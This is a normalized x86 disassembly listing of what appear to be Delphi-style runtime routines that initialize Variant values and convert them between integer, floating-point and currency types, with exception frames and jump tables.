mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax esi
call sub_3a70bdc
sub_3a70fc4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_3a71020
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_3a70f80
lea eax [ ebp - 0x10 ]
call [ rw-data ]
movzx ecx di
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_3a7124c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a71027
lea eax [ ebp - 0x10 ]
call sub_3a70c58
retn
sub_3a71030
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_3a7106e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_3a746a4
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_3a75048
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a71075
lea eax [ ebp - 0x4 ]
call sub_3a65a7c
retn
sub_3a7107c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_3a710ba
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_3a73f84
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_3a7501c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a710c1
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a710c8
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_3a71106
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_3a74d3c
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_3a750ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7110d
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
retn
sub_3a71114
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_3a71152
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_3a74c70
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_3a75080
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a71159
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
retn
sub_3a71160
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
movzx eax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0x14
jb r-xdata
mov edx esi
and dx 0xfff
cmp dx 0x14
jae r-xdata
mov edx ebx
mov eax edi
mov ecx 0x8
call sub_3a7124c
push esi
push 0x0
push 0x400
push edi
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov ecx esi
call sub_3a708b4
jmp r-xdata
mov edx esi
call sub_3a70420
push esi
push 0x0
push 0x400
push ebx
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov ecx esi
call sub_3a708b4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_3a711e0
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov ebx edx
mov edi eax
movzx ebp [ ebx ]
cmp bp 0x101
jne r-xdata
mov edx esp
mov eax ebp
call sub_3a7618c
test al al
je r-xdata
mov edx ebx
mov eax edi
mov ecx esi
call sub_3a70fc4
jmp r-xdata
mov edx esp
mov eax esi
call sub_3a7618c
test al al
je r-xdata
push esi
mov ecx ebx
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx esi
call sub_3a71160
mov ecx ebx
mov edx edi
mov eax [ esp ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
jmp r-xdata
sub_3a7124c
push ebx
push esi
mov ebx edx
mov esi eax
movzx eax [ ebx ]
movzx edx ax
cmp ecx edx
jne r-xdata
cmp ax 0x400c
jne r-xdata
mov edx ebx
mov eax esi
call sub_3a70f80
pop esi
pop ebx
retn
mov edx ecx
cmp edx 0x14
ja r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_3a7124c
jmp r-xdata
mov edx ecx
sub edx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_3a71291 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_3a7107c
jmp r-xdata
dec edx
je r-xdata
cmp [ ebx ] 0x1
jne r-xdata
mov eax esi
call sub_3a709c0
jmp r-xdata
mov eax ebx
call sub_3a71bbc
mov edx eax
mov eax esi
call sub_3a74ec4
jmp r-xdata
mov eax ebx
call sub_3a71610
mov edx eax
mov eax esi
call sub_3a74e24
jmp r-xdata
mov eax ebx
call sub_3a72f8c
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax esi
call sub_3a74f10
jmp r-xdata
mov eax ebx
call sub_3a72bf8
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_3a74f34
jmp r-xdata
mov eax ebx
call sub_3a738cc
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax esi
call sub_3a74f60
jmp r-xdata
mov eax ebx
call sub_3a73364
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_3a74f8c
jmp r-xdata
mov edx ebx
mov eax esi
call sub_3a71030
jmp r-xdata
mov eax ebx
call sub_3a726d8
mov edx eax
mov eax esi
call sub_3a74fb8
jmp r-xdata
mov eax ebx
call sub_3a71a60
mov edx eax
mov eax esi
call sub_3a74ea4
jmp r-xdata
mov eax ebx
call sub_3a71b14
mov edx eax
mov eax esi
call sub_3a74e44
jmp r-xdata
mov eax ebx
call sub_3a71cb4
mov edx eax
mov eax esi
call sub_3a74e64
jmp r-xdata
mov eax ebx
call sub_3a71d90
mov edx eax
mov eax esi
call sub_3a74e84
jmp r-xdata
mov eax ebx
call sub_3a720e0
push edx
push eax
mov eax esi
call sub_3a74ee4
jmp r-xdata
mov edx ebx
mov eax esi
call sub_3a710c8
jmp r-xdata
mov edx ebx
mov eax esi
call sub_3a71114
jmp r-xdata
mov dx 0x101
call sub_3a70420
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_3a70c58
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_3a711e0
xor edx edx
mov ax 0x1
call sub_3a70420
jmp r-xdata
sub_3a71478
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_3a7151b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x4 ]
call sub_3a746a4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_3a65528
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
call sub_3a69a2c
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a71522
lea eax [ ebp - 0xc ]
call sub_3a652a0
lea eax [ ebp - 0x4 ]
call sub_3a65a7c
retn
mov eax ebx
call sub_3a726d8
and eax 0x7f
mov [ ebp - 0x8 ] eax
jmp r-xdata
movzx edx [ ebx ]
mov cx 0x3
call sub_3a708b4
jmp r-xdata
sub_3a7152c
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov cx 0x3
call sub_3a708b4
mov eax [ esp + 0x8 ]
add esp 0x10
pop ebx
retn
sub_3a71568
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x14 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_3a715bc
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x14 ]
call sub_3a70f80
lea eax [ ebp - 0x14 ]
call [ rw-data ]
lea eax [ ebp - 0x14 ]
call sub_3a71610
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a715c3
lea eax [ ebp - 0x14 ]
call sub_3a70c58
retn
sub_3a715cc
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
movzx eax [ esi ]
call sub_3a7618c
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x3
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
sub_3a71610
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_3a71a31
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_3a71643 ]
mov eax [ ebp - 0x4 ]
call sub_3a71478
mov [ ebp - 0x8 ] eax
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_3a63418
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_3a63418
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_3a63418
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_3a63418
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a71478
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ eax + 0x8 ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_3a71610
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a7152c
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a71568
mov [ ebp - 0x8 ] eax
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov dx 0x3
mov ax 0x1
call sub_3a70420
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_3a64248
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_3a64248
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_3a64248
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_3a64248
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_3a64248
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_3a64248
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x4 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_3a715cc
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a7152c
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_3a7152c
mov [ ebp - 0x8 ] eax
jmp r-xdata
jmp [ eax * 4 + jump_table_3a71867 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_3a63418
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_3a63418
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_3a63418
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_3a63418
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a71478
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_3a71610
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_3a64248
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_3a64248
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_3a64248
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_3a64248
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_3a64248
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_3a64248
sub_3a71a60
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x10
mov ax 0x1
call sub_3a70420
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x5
je r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_3a71aee
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_3a71610
mov ebx eax
add ebx 0x80
cmp ebx 0xff
jbe r-xdata
add ebx 0xffffff80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_3a64248
sub_3a71b14
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x11
mov ax 0x1
call sub_3a70420
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x6
je r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_3a71b99
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_3a71610
mov ebx eax
cmp ebx 0xff
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_3a64248
sub_3a71bbc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x11
ja r-xdata
xor eax eax
push ebp
push sub_3a71c91
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_3a71610
mov ebx eax
add ebx 0x8000
cmp ebx 0xffff
jbe r-xdata
movzx eax [ eax + lookup_table_3a71be3 ]
jmp [ eax * 4 + jump_table_3a71bf5 ]
add ebx 0xffff8000
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_3a64248
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x2
mov ax 0x1
call sub_3a70420
sub_3a71cb4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x12
ja r-xdata
xor eax eax
push ebp
push sub_3a71d6a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_3a71610
mov ebx eax
cmp ebx 0xffff
jbe r-xdata
movzx eax [ eax + lookup_table_3a71cd7 ]
jmp [ eax * 4 + jump_table_3a71cea ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_3a64248
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x12
mov ax 0x1
call sub_3a70420
sub_3a71d90
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x13
ja r-xdata
xor eax eax
push ebp
push sub_3a71e56
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_3a720e0
test edx edx
je r-xdata
movzx eax [ eax + lookup_table_3a71db7 ]
jmp [ eax * 4 + jump_table_3a71dcb ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_3a64248
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x13
mov ax 0x1
call sub_3a70420
sub_3a71e7c
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ esp + 0x10 ]
call sub_3a63418
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x18
pop ebx
retn
movzx edx [ ebx ]
mov cx 0x14
call sub_3a708b4
mov [ esp ] 0x0
mov [ esp + 0x4 ] 0x0
mov eax ebx
call sub_3a726d8
and eax 0x7f
xor edx edx
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
sub_3a71f28
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
xor edx edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_3a72016
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x4 ]
call sub_3a746a4
lea eax [ ebp - 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_3a65528
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x10 ]
call sub_3a69a4c
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7201d
lea eax [ ebp - 0x24 ]
call sub_3a652a0
lea eax [ ebp - 0x4 ]
call sub_3a65a7c
retn
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ ebp - 0x20 ]
call sub_3a63418
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
movzx edx [ ebx ]
mov cx 0x14
call sub_3a708b4
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
mov eax ebx
call sub_3a726d8
and eax 0x7f
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
sub_3a72028
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_3a7207f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_3a70f80
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_3a720e0
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a72086
lea eax [ ebp - 0x18 ]
call sub_3a70c58
retn
sub_3a72094
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
movzx eax [ esi ]
call sub_3a7618c
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x14
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_3a720e0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_3a724ec
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_3a72113 ]
mov eax [ ebp - 0x4 ]
call sub_3a71f28
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
dec dx
je r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_3a63418
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_3a63418
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_3a63418
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_3a63418
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a71f28
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x8 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0xc ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_3a720e0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a71e7c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a72028
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x0
